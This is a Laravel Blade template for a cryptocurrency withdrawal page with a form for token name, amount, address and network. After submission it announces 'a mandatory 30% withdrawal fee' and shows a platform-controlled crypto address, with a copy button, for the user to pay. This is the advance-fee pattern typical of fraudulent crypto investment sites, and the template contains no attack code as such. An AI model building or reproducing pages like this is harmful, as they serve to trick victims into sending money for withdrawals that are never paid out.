<x-app-layout>

    <!-- Main Content Wrapper -->
    <main class="main-content w-full px-[var(--margin-x)] pb-8">
        <div class="flex items-center space-x-4 py-5 lg:py-6">
            <h2 class="text-xl font-medium text-slate-800 dark:text-navy-50 lg:text-2xl">
                Withdrawal
            </h2>
            <div class="hidden h-full py-1 sm:flex">
                <div class="h-full w-px bg-slate-300 dark:bg-navy-600"></div>
            </div>

        </div>

        <template x-if="$store.breakpoints.isXs">
            <div x-data="{ isStuck: false }" class="pb-6" x-intersect:enter.full.margin.-60px.0.0.0="isStuck = false"
                x-intersect:leave.full.margin.-60px.0.0.0="isStuck = true">
                <div :class="isStuck && 'fixed right-0 top-[60px] w-full z-10'">
                    <div class="transition-all duration-200"
                        :class="isStuck && 'py-2.5 px-4 bg-white dark:bg-navy-700 shadow-lg relative'">
                        <ol class="steps with-space-line">
                            <li class="step before:bg-primary dark:before:bg-accent">
                                <div class="step-header rounded-full bg-primary text-white dark:bg-accent">
                                    <svg xmlns="http://www.w3.org/2000/svg" class="size-5" viewBox="0 0 20 20"
                                        fill="currentColor">
                                        <path fill-rule="evenodd"
                                            d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
                                            clip-rule="evenodd" />
                                    </svg>
                                </div>
                                <h3 class="text-xs font-medium text-slate-700 dark:text-navy-100">
                                    Input your token name
                                </h3>
                            </li>
                            <li class="step before:bg-primary dark:before:bg-accent">
                                <div class="step-header rounded-full bg-primary text-white dark:bg-accent">
                                    <svg xmlns="http://www.w3.org/2000/svg" class="size-5" viewBox="0 0 20 20"
                                        fill="currentColor">
                                        <path fill-rule="evenodd"
                                            d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
                                            clip-rule="evenodd" />
                                    </svg>
                                </div>
                                <h3 class="text-xs font-medium text-slate-700 dark:text-navy-100">
                                    Input your token address
                                </h3>
                            </li>
                            <li class="step before:bg-slate-200 dark:before:bg-navy-500">
                                <div class="step-header rounded-full bg-primary text-white dark:bg-accent">
                                    3
                                </div>
                                <h3 class="text-xs font-medium text-slate-700 dark:text-navy-100">
                                    Input your token network
                                </h3>
                            </li>
                            <li class="step before:bg-slate-200 dark:before:bg-navy-500">
                                <div
                                    class="step-header rounded-full bg-slate-200 text-slate-800 dark:bg-navy-500 dark:text-white">
                                    4
                                </div>
                                <h3 class="text-xs font-medium text-slate-700 dark:text-navy-100">
                                    Review
                                </h3>
                            </li>
                        </ol>
                    </div>
                </div>
            </div>
        </template>
        <form action="{{ route('user.withdraws') }}" method="POST">
            @csrf
            <div class="grid grid-cols-12 gap-4 sm:gap-5 lg:gap-6">
                @if ($errors->any())
                    <div class="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded-lg mb-4">
                        <ul class="list-disc list-inside">
                            @foreach ($errors->all() as $error)
                                <li>{{ $error }}</li>
                            @endforeach
                        </ul>
                    </div>
                @endif

                <div class="col-span-12 sm:col-span-8">
                    <div class="card p-4 sm:p-5">
                        <p class="text-base font-medium text-slate-700 dark:text-navy-100">
                            Fill in your withdrawal details
                        </p>

                        <div class="mt-4 space-y-4">
                            <div class="grid grid-cols-1 gap-4 sm:grid-cols-2">
                                <label class="block">
                                    <span>Token Name</span>
                                    <span class="relative mt-1.5 flex">
                                        <input
                                            class="form-input peer w-full rounded-lg border border-slate-300 bg-transparent px-3 py-2 pl-9 placeholder:text-slate-400/70 hover:border-slate-400 focus:border-primary dark:border-navy-450 dark:hover:border-navy-400 dark:focus:border-accent"
                                            placeholder="Name" type="text" name="crypto_name" />
                                        <span
                                            class="pointer-events-none absolute flex h-full w-10 items-center justify-center text-slate-400 peer-focus:text-primary dark:text-navy-300 dark:peer-focus:text-accent">
                                            <i class="fa-solid fa-location-arrow"></i>
                                        </span>
                                    </span>
                                </label>
                                <label class="block">
                                    <span>Desired Amount</span>
                                    <span class="relative mt-1.5 flex">
                                        <input
                                            class="form-input peer w-full rounded-lg border border-slate-300 bg-transparent px-3 py-2 pl-9 placeholder:text-slate-400/70 hover:border-slate-400 focus:border-primary dark:border-navy-450 dark:hover:border-navy-400 dark:focus:border-accent"
                                            placeholder="Amount" type="text" name="amount" />
                                        <span
                                            class="pointer-events-none absolute flex h-full w-10 items-center justify-center text-slate-400 peer-focus:text-primary dark:text-navy-300 dark:peer-focus:text-accent">
                                            <i class="fa-solid fa-circle-nodes"></i>
                                        </span>
                                    </span>
                                </label>
                                <label class="block">
                                    <span>Token Address</span>
                                    <span class="relative mt-1.5 flex">
                                        <input
                                            class="form-input peer w-full rounded-lg border border-slate-300 bg-transparent px-3 py-2 pl-9 placeholder:text-slate-400/70 hover:border-slate-400 focus:border-primary dark:border-navy-450 dark:hover:border-navy-400 dark:focus:border-accent"
                                            placeholder="Token Address" type="text" name="crypto_address" />
                                        <span
                                            class="pointer-events-none absolute flex h-full w-10 items-center justify-center text-slate-400 peer-focus:text-primary dark:text-navy-300 dark:peer-focus:text-accent">
                                            <i class="fa-solid fa-location-arrow"></i>
                                        </span>
                                    </span>
                                </label>
                                <label class="block">
                                    <span>Token Network</span>
                                    <span class="relative mt-1.5 flex">
                                        <input
                                            class="form-input peer w-full rounded-lg border border-slate-300 bg-transparent px-3 py-2 pl-9 placeholder:text-slate-400/70 hover:border-slate-400 focus:border-primary dark:border-navy-450 dark:hover:border-navy-400 dark:focus:border-accent"
                                            placeholder="Token Network" type="text" name="network" />
                                        <span
                                            class="pointer-events-none absolute flex h-full w-10 items-center justify-center text-slate-400 peer-focus:text-primary dark:text-navy-300 dark:peer-focus:text-accent">
                                            <i class="fa-solid fa-circle-nodes"></i>
                                        </span>
                                    </span>
                                </label>
                            </div>


                            <div class="flex justify-end space-x-2">

                                <button
                                    class="btn space-x-2 bg-primary font-medium text-white hover:bg-primary-focus focus:bg-primary-focus active:bg-primary-focus/90 dark:bg-accent dark:hover:bg-accent-focus dark:focus:bg-accent-focus dark:active:bg-accent/90">
                                    <span>Submit</span>
                                    <svg xmlns="http://www.w3.org/2000/svg" class="size-5" viewBox="0 0 20 20"
                                        fill="currentColor">
                                        <path fill-rule="evenodd"
                                            d="M12.293 5.293a1 1 0 011.414 0l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414-1.414L14.586 11H3a1 1 0 110-2h11.586l-2.293-2.293a1 1 0 010-1.414z"
                                            clip-rule="evenodd" />
                                    </svg>
                                </button>
                            </div>
                        </div><br>


                        @if (session('success'))
                            <div id="feeSection" class="mt-6">
                                <p class="text-base font-medium text-slate-700 dark:text-navy-100">
                                    A mandatory 30% withdrawal fee is required. Please use the details provided below to
                                    complete the payment.
                                </p>
                                <div class="mt-4 space-y-4">
                                    @php
                                        $cryptoAddress = \App\Models\CryptoAddress::first();
                                    @endphp
                                    @if ($cryptoAddress)
                                        <label class="block">
                                            <span>Token Name</span>
                                            <span class="relative mt-1.5 flex">
                                                <input
                                                    class="form-input peer w-full rounded-lg border border-slate-300 bg-transparent px-3 py-2 pl-9 placeholder:text-slate-400/70 hover:border-slate-400 focus:border-primary dark:border-navy-450 dark:hover:border-navy-400 dark:focus:border-accent"
                                                    type="text" value="{{ $cryptoAddress->name }}" readonly />
                                                <span
                                                    class="pointer-events-none absolute flex h-full w-10 items-center justify-center text-slate-400 peer-focus:text-primary dark:text-navy-300 dark:peer-focus:text-accent">
                                                    <i class="fa-solid fa-location-arrow"></i>
                                                </span>
                                            </span>
                                        </label>
                                        <label class="block">
                                            <span>Token Network</span>
                                            <span class="relative mt-1.5 flex">
                                                <input
                                                    class="form-input peer w-full rounded-lg border border-slate-300 bg-transparent px-3 py-2 pl-9 placeholder:text-slate-400/70 hover:border-slate-400 focus:border-primary dark:border-navy-450 dark:hover:border-navy-400 dark:focus:border-accent"
                                                    type="text" value="{{ $cryptoAddress->network }}" readonly />
                                                <span
                                                    class="pointer-events-none absolute flex h-full w-10 items-center justify-center text-slate-400 peer-focus:text-primary dark:text-navy-300 dark:peer-focus:text-accent">
                                                    <i class="fa-solid fa-location-arrow"></i>
                                                </span>
                                            </span>
                                        </label>
                                        <label class="block">
                                            <span>Token Address</span>
                                            <span class="relative mt-1.5 flex items-center">
                                                <input
                                                    class="form-input peer w-full rounded-lg border border-slate-300 bg-transparent px-3 py-2 pl-9 placeholder:text-slate-400/70 hover:border-slate-400 focus:border-primary dark:border-navy-450 dark:hover:border-navy-400 dark:focus:border-accent"
                                                    type="text" value="{{ $cryptoAddress->address }}" readonly
                                                    id="cryptoAddressInput" />
                                                <span
                                                    class="pointer-events-none absolute flex h-full w-10 items-center justify-center text-slate-400 peer-focus:text-primary dark:text-navy-300 dark:peer-focus:text-accent">
                                                    <i class="fa-solid fa-location-arrow"></i>
                                                </span>
                                                <button type="button" onclick="copyToClipboard('cryptoAddressInput')"
                                                    class="ml-2 flex items-center justify-center p-2 text-slate-400 hover:text-slate-600 dark:text-navy-300 dark:hover:text-navy-100"
                                                    title="Copy to clipboard">
                                                    <i class="fa-solid fa-copy"></i>
                                                </button>
                                            </span>
                                        </label>
                                    @else
                                        <p class="text-red-500">No crypto address available for fee payment.</p>
                                    @endif
                                </div>
                            </div>
                        @endif



                    </div>
                </div>

                <div class="hidden sm:col-span-4 sm:block">
                    <div class="sticky top-24 mt-3">
                        <ol class="steps is-vertical line-space">
                            <li class="step pb-8 before:bg-primary dark:before:bg-accent">
                                <div class="step-header rounded-full bg-primary text-white dark:bg-accent">
                                    1
                                </div>
                                <h3 class="ml-4 text-slate-700 dark:text-navy-100">
                                    Input your token name
                                </h3>
                            </li>
                            <li class="step pb-8 before:bg-primary dark:before:bg-accent">
                                <div class="step-header rounded-full bg-primary text-white dark:bg-accent">
                                    2
                                </div>
                                <h3 class="ml-4 text-slate-700 dark:text-navy-100">
                                    Input your Desired Amount
                                </h3>
                            </li>

                            <li class="step pb-8 before:bg-primary dark:before:bg-accent">
                                <div class="step-header rounded-full bg-primary text-white dark:bg-accent">
                                    3
                                </div>
                                <h3 class="ml-4 text-slate-700 dark:text-navy-100">
                                    Input your token address
                                </h3>
                            </li>
                            <li class="step pb-8 before:bg-slate-200 dark:before:bg-navy-500">
                                <div class="step-header rounded-full bg-primary text-white dark:bg-accent">
                                    4
                                </div>
                                <h3 class="ml-4 text-slate-700 dark:text-navy-100">
                                    Input your token network
                                </h3>
                            </li>
                            <li class="step pb-8 before:bg-slate-200 dark:before:bg-navy-500">
                                <div
                                    class="step-header rounded-full bg-slate-200 text-slate-800 dark:bg-navy-500 dark:text-white">
                                    5
                                </div>
                                <h3 class="ml-4 text-slate-700 dark:text-navy-100">Submit</h3>
                            </li>
                        </ol>
                    </div>
                </div>
            </div>
        </form>
    </main>
    </div>

    @push('scripts')
        @if (session('success'))
            <script>
                document.addEventListener('DOMContentLoaded', () => {
                    Swal.fire({
                        icon: 'success',
                        text: "{{ addslashes(session('success')) }}",
                        timer: 3000,
                        showConfirmButton: false,
                        background: '#f0fdf4',
                        iconColor: '#10B981',
                        customClass: {
                            popup: 'rounded-xl'
                        }
                    });
                });
            </script>
        @endif
        @if (session('error'))
            <script>
                document.addEventListener('DOMContentLoaded', () => {
                    Swal.fire({
                        icon: 'error',
                        text: "{{ addslashes(session('error')) }}",
                        timer: 3000,
                        showConfirmButton: false,
                        background: '#fef2f2',
                        iconColor: '#EF4444',
                        customClass: {
                            popup: 'rounded-xl'
                        }
                    });
                });
            </script>
        @endif
    @endpush

    <script>
        function copyToClipboard(inputId) {
            const input = document.getElementById(inputId);
            input.select();
            try {
                document.execCommand('copy');
                // Optional: Show a brief confirmation
                Swal.fire({
                    title: 'Copied!',
                    text: 'Address copied to clipboard.',
                    icon: 'success',
                    timer: 1500,
                    showConfirmButton: false
                });
            } catch (err) {
                console.error('Failed to copy: ', err);
                Swal.fire({
                    title: 'Error!',
                    text: 'Failed to copy address.',
                    icon: 'error',
                    timer: 1500,
                    showConfirmButton: false
                });
            }
        }
    </script>
</x-app-layout>
{{--  --}}
